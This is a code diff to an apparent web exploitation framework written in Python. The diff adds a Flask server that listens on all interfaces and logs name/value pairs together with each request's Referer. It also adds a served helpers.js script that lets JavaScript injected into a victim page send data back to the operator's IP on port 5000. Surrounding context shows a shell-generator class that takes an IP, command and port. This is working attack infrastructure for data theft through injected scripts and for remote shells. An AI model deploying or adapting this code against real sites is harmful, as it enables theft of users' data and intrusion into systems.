@@ -19,6 +19,7 @@ import json
 import re
 import smtplib
 from flask_cors import CORS
+import netifaces
 
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -26,6 +27,117 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 #       Web Exploitation Framework
 #     coded by highjack (OSID-13120)
 
+app = Flask(__name__)
+_interface = ""
+
+CORS(app)
+
+def get_ip():
+    global _interface
+    interface_settings = netifaces.ifaddresses(_interface)
+    ip = interface_settings[netifaces.AF_INET][0]['addr']
+    return ip
+    
+
+@app.route("/get")
+def get_value():
+    name = request.args.get('name')
+    con = sqlite3.connect('./data/webpwn.db3')
+    sql = "SELECT name, value, ref from logs where name=? order by id desc limit 1"
+       
+    cur = con.cursor()
+    cur.execute(sql, (name,))
+    rows = cur.fetchall()
+    json_output = ""
+    for row in rows:
+        name, value, ref = row
+        json_output = {"name":name, "value":value, "ref":ref}
+    return  json.dumps(json_output)
+
+@app.route("/helpers.js")
+def helpers_js():
+    js = """function request(method, url, headers, data, callback){
+        var xhttp = new XMLHttpRequest();
+
+        xhttp.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                response  = this.responseText;
+                callback(response);
+                return response;
+                }
+        };
+
+        if (method == "POST")
+        {
+            xhttp.open("POST", url, true);
+        }
+        else
+        {
+            xhttp.open("GET",url)
+        }
+        if (method == "POST")
+        {
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        }
+    
+        if (headers != "")
+        {
+            for (var key in headers)
+            {
+                var value = headers[key];
+                xhttp.setRequestHeader(key, value);
+            }
+        }
+
+        if (method == "POST")
+        {
+            xhttp.send(data);
+        }
+        else
+        {
+            xhttp.send()
+        }
+
+    }
+
+    function get_url()
+    {
+        var full_url = window.location.href;
+        var array = full_url.split("/");
+        var url = array[0]+"//"+array[2];
+        return url;
+    }
+    function parse_json(response)
+    {
+        var obj = JSON.parse(response.toString());
+        return response;
+    }
+
+    function get_data(name)
+    {
+        var result = request("GET", "http://$$current_ip$$:5000/get?name="+name, "", "", parse_json);
+        return result
+    }
+
+    function set_data(name, value)
+    {
+        request("GET", "http://$$current_ip$$:5000/set?name="+name+"&value="+value, "", "", parse_json);
+    }
+    """
+    js = js.replace("$$current_ip$$", get_ip())
+    return js
+
+@app.route("/set")
+def set_value():
+    con = sqlite3.connect('./data/webpwn.db3')
+    sql = "INSERT INTO logs (name, value, ref) VALUES (?, ?, ?)"
+    ref = request.headers.get("Referer")
+    name = request.args.get('name')
+    value = request.args.get('value')
+    cur = con.cursor()
+    cur.execute(sql, (name, value, ref))    
+    con.commit()
+    return "{}:{} added to database".format(name, value)
 
 class generateshell:
     def customize_shell(self, base_shell, ip, cmd, port, lang):
@@ -105,45 +217,18 @@ class generateshell:
 
 class webpwn:
     proxy_enabled = False
-    proxies = {'http': 'http://192.168.1.222:31337','https': 'http://192.168.1.222:31337',}
+    proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080',}
     debug_enabled = False
-    app = Flask(__name__)
-    CORS(app)
+     
 
-    
-    @app.route("/get")
-    def get_value():
-        name = request.args.get('name')
-        con = sqlite3.connect('./data/webpwn.db3')
-        sql = "SELECT name, value, ref from logs where name=? order by id desc limit 1"
-       
-        cur = con.cursor()
-        cur.execute(sql, (name,))
-        rows = cur.fetchall()
-        json_output = ""
-        for row in rows:
-            name, value, ref = row
-            json_output = {"name":name, "value":value, "ref":ref}
-        return  json.dumps(json_output)
-
-    @app.route("/set")
-    def set_value():
-        con = sqlite3.connect('./data/webpwn.db3')
-        sql = "INSERT INTO logs (name, value, ref) VALUES (?, ?, ?)"
-        ref = request.headers.get("Referer")
-        name = request.args.get('name')
-        value = request.args.get('value')
-        cur = con.cursor()
-        cur.execute(sql, (name, value, ref))    
-        con.commit()
-        return "{}:{} added to database".format(name, value)
-
-    def __init__(self, exploit_name, author, date, proxy_enabled=False, debug_enabled=False):
+    def __init__(self, exploit_name, author, date, proxy_enabled=False, debug_enabled=False, interface=None):
         self.exploit_name = exploit_name
         self.author = author
         self.date = date
         self.proxy_enabled = proxy_enabled
         self.debug_enabled = debug_enabled
+        global _interface
+        _interface = interface
         self.banner(self.exploit_name, self.author, self.date)
     
     def error(self, message):
@@ -281,7 +366,7 @@ class webpwn:
 
     def webserver(self, static_folder, port):
         self.status("Starting Flask Server...")
-        threading.Thread(target=self.app.run).start()
+        threading.Thread(target=app.run(host="0.0.0.0")).start()
         
 
     
